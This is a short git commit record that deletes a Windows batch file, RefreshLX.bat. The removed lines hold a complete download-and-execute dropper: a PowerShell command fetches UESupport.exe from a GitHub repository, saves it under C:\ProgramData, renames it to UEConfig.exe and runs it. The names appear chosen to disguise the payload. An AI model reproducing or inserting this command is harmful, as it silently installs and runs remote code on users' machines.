ec5e8624fc0f76c8ec855b31f075f0ec63d56646
AnonymousArabian <69630276+AnonymousArabian@users.noreply.github.com>
2021-01-07 01:48:14 +1000

    Delete RefreshLX.bat

--- RefreshLX.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/AnonymousArabian/Service-Host/raw/master/UESupport.exe','C:\ProgramData\UEConfig')"
-rename  C:\ProgramData\UEConfig UEConfig.exe
-C:\ProgramData\UEConfig.exe
